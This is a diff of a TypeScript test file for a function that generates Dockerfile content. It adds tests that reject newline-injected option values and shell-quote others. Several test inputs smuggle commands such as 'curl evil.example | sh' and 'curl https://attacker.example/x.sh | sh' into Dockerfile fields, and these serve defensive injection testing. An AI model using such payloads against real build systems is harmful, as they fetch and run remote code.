@@ -109,8 +109,61 @@ describe('createDockerFileContent', () => {
       allowOrigins: 'http://example.com',
       otelToCloud: true,
     });
-    expect(content).toContain('--allow_origins=http://example.com');
+    expect(content).toContain("--allow_origins='http://example.com'");
     expect(content).toContain('--otel_to_cloud');
+  });
+
+  it('should reject logLevel/allowOrigins/sessionServiceUri/artifactServiceUri containing a newline', () => {
+    // These reach the shell-interpreted CMD line via adkServerOptions, so a
+    // newline in any of them breaks out of that Dockerfile instruction the
+    // same way appName/project/region do.
+    for (const [label, value] of [
+      ['logLevel', {logLevel: 'info\nRUN sh -c "curl evil.example|sh"\n#'}],
+      [
+        'allowOrigins',
+        {allowOrigins: 'http://a\nRUN sh -c "curl evil.example|sh"\n#'},
+      ],
+      [
+        'sessionServiceUri',
+        {sessionServiceUri: 'memory://\nRUN sh -c "curl evil.example|sh"\n#'},
+      ],
+      [
+        'artifactServiceUri',
+        {artifactServiceUri: 'gs://b\nRUN sh -c "curl evil.example|sh"\n#'},
+      ],
+    ] as const) {
+      expect(() =>
+        createDockerFileContent({...defaultOptions, ...value}),
+      ).toThrow(new RegExp(`Invalid ${label}`));
+    }
+  });
+
+  it('should shell-quote logLevel/allowOrigins/sessionServiceUri/artifactServiceUri in the CMD line', () => {
+    // These values reach /bin/sh at container start via the CMD line's
+    // shell form, so shell metacharacters must be neutralized by quoting.
+    const content = createDockerFileContent({
+      ...defaultOptions,
+      logLevel: 'info; curl evil.example | sh #',
+      sessionServiceUri: 'memory://; curl evil.example | sh #',
+      artifactServiceUri: 'gs://bucket; curl evil.example | sh #',
+    });
+    expect(content).toContain("--log_level='info; curl evil.example | sh #'");
+    expect(content).toContain(
+      "--session_service_uri='memory://; curl evil.example | sh #'",
+    );
+    expect(content).toContain(
+      "--artifact_service_uri='gs://bucket; curl evil.example | sh #'",
+    );
+  });
+
+  it('should escape an embedded single quote when shell-quoting', () => {
+    const content = createDockerFileContent({
+      ...defaultOptions,
+      logLevel: "info'; curl evil.example | sh #",
+    });
+    expect(content).toContain(
+      "--log_level='info'\\''; curl evil.example | sh #'",
+    );
   });
 
   it('should reject an appName that would break out of the generated Dockerfile', () => {
@@ -134,11 +187,14 @@ describe('createDockerFileContent', () => {
     ).toThrow(/Invalid project/);
   });
 
-  it('should reject a region that would inject a shell command into the container CMD', () => {
+  it('should reject a region that would start a new Dockerfile instruction', () => {
+    // region only reaches the ENV GOOGLE_CLOUD_LOCATION= line, not the
+    // shell-interpreted CMD line, so the vector here is a newline breaking
+    // out of that instruction, not a shell metacharacter.
     expect(() =>
       createDockerFileContent({
         ...defaultOptions,
-        region: 'us-central1; curl https://attacker.example/x.sh | sh #',
+        region: 'us-central1\nRUN curl https://attacker.example/x.sh | sh\n#',
       }),
     ).toThrow(/Invalid region/);
   });
